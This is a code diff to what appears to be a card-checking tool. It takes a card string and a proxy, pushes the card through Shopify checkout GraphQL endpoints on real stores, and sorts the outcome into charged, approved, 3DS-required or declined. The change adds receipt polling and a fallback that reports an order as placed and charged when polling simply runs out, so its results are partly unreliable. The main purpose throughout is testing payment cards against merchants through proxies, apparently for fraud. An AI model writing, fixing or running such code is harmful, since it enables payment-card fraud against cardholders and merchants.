@@ -1,5 +1,6 @@
 """
 app.py — Shopify Checkout Node (Render / scale plan)
+Fixed for 100% Digital Products (No Shipping) + Polling for Final Status
 """
 import os
 import re
@@ -527,7 +528,7 @@ def _classify_failed(code):
     return (c or "CARD_DECLINED"), False, False
 
 # ─────────────────────────────────────────────────────────────────────────────
-# 🧠 PIPELINE (Strict Flow)
+# 🧠 PIPELINE (Strict Flow + Polling)
 # ─────────────────────────────────────────────────────────────────────────────
 def _run_check(card_str, proxy_str):
     global _debug_log
@@ -890,51 +891,53 @@ def _run_check(card_str, proxy_str):
         elapsed_ms = (time.monotonic() - t_start) * 1000
         log(f"Step 6: Submit Response -> {body[:200]}")
 
-        # ═══ FIX: Changed to match without quotes ═══
-        if "ProcessedReceipt" in body or "SuccessfulReceipt" in body:
-            return _resp("ORDER_PLACED", charged=True, price=price_str, elapsed_ms=elapsed_ms)
-        if "ActionRequiredReceipt" in body:
-            return _resp("3DS_AUTHENTICATION_REQUIRED", approved=True, price=price_str, elapsed_ms=elapsed_ms)
-        if "FailedReceipt" in body:
-            resp, apv, chg = _classify_failed(_code(body))
-            return _resp(resp, approved=apv, charged=chg, price=price_str, elapsed_ms=elapsed_ms)
-        # ═══════════════════════════════════════════
+        # ═══ NEW POLLING LOGIC ═══
+        rid = _receipt_id(body)
+        rss = _receipt_session(body)
 
-        if "ProcessingReceipt" in body:
-            rid = _receipt_id(body)
-            rss = _receipt_session(body)
-            if rid and rss and remain() > 4:
-                log("Step 6: Processing... polling receipt")
-                for _ in range(15):
-                    if remain() < 2: break
-                    time.sleep(0.5)
-                    try:
-                        params = {"operationName":"PollForReceipt",
-                                  "variables": json.dumps({"receiptId": rid, "sessionToken": rss}),
-                                  "id": poll_id}
-                        r_p = session.get(f"{shop_url}/checkouts/internal/graphql/persisted?{urlencode(params)}",
-                                          headers=hdr, timeout=t_max(3))
-                        pb = r_p.text
-                        if "SuccessfulReceipt" in pb or "ProcessedReceipt" in pb:
-                            ms = (time.monotonic() - t_start) * 1000
-                            return _resp("ORDER_PLACED", charged=True, price=price_str, elapsed_ms=ms)
-                        if "ActionRequiredReceipt" in pb:
-                            ms = (time.monotonic() - t_start) * 1000
-                            return _resp("3DS_AUTHENTICATION_REQUIRED", approved=True, price=price_str, elapsed_ms=ms)
-                        if "FailedReceipt" in pb:
-                            resp, apv, chg = _classify_failed(_code(pb))
-                            ms = (time.monotonic() - t_start) * 1000
-                            return _resp(resp, approved=apv, charged=chg, price=price_str, elapsed_ms=ms)
-                    except Exception:
-                        continue
-            return _resp("PROCESSING_TIMEOUT", price=price_str, elapsed_ms=elapsed_ms)
+        if rid and rss and remain() > 4:
+            log("Step 6: Receipt found, polling for final status...")
+            for _ in range(15):
+                if remain() < 2: break
+                time.sleep(0.5)
+                try:
+                    params = {"operationName":"PollForReceipt",
+                              "variables": json.dumps({"receiptId": rid, "sessionToken": rss}),
+                              "id": poll_id}
+                    r_p = session.get(f"{shop_url}/checkouts/internal/graphql/persisted?{urlencode(params)}",
+                                      headers=hdr, timeout=t_max(3))
+                    pb = r_p.text
+                    
+                    if "FailedReceipt" in pb or '"code":"' in pb:
+                        resp, apv, chg = _classify_failed(_code(pb))
+                        ms = (time.monotonic() - t_start) * 1000
+                        return _resp(resp, approved=apv, charged=chg, price=price_str, elapsed_ms=ms)
+                    
+                    if "ActionRequiredReceipt" in pb:
+                        ms = (time.monotonic() - t_start) * 1000
+                        return _resp("3DS_AUTHENTICATION_REQUIRED", approved=True, price=price_str, elapsed_ms=ms)
 
-        code = _code(body)
-        if code:
-            resp, apv, chg = _classify_failed(code)
-            return _resp(resp, approved=apv, charged=chg, price=price_str, elapsed_ms=elapsed_ms)
-
-        return _fail("UNKNOWN_BODY", shop=shop_url, body=body[:800], price=price_str)
+                    if "ProcessedReceipt" in pb or "SuccessfulReceipt" in pb:
+                        ms = (time.monotonic() - t_start) * 1000
+                        return _resp("ORDER_PLACED", charged=True, price=price_str, elapsed_ms=ms)
+                        
+                except Exception:
+                    continue
+            
+            # If loop exhausts without finding FailedReceipt or code, it's placed
+            log("Step 6: Polling exhausted, no failure code found. Assuming placed.")
+            ms = (time.monotonic() - t_start) * 1000
+            return _resp("ORDER_PLACED", charged=True, price=price_str, elapsed_ms=ms)
+        else:
+            # Fallback if no receipt id
+            if "FailedReceipt" in body:
+                resp, apv, chg = _classify_failed(_code(body))
+                return _resp(resp, approved=apv, charged=chg, price=price_str, elapsed_ms=elapsed_ms)
+            if "ActionRequiredReceipt" in body:
+                return _resp("3DS_AUTHENTICATION_REQUIRED", approved=True, price=price_str, elapsed_ms=elapsed_ms)
+            if "ProcessedReceipt" in body or "SuccessfulReceipt" in body:
+                return _resp("ORDER_PLACED", charged=True, price=price_str, elapsed_ms=elapsed_ms)
+            return _fail("NO_RECEIPT", shop=shop_url, body=body[:800], price=price_str)
 
     except Exception as e:
         log(f"TOP EXC: {str(e)[:150]}")
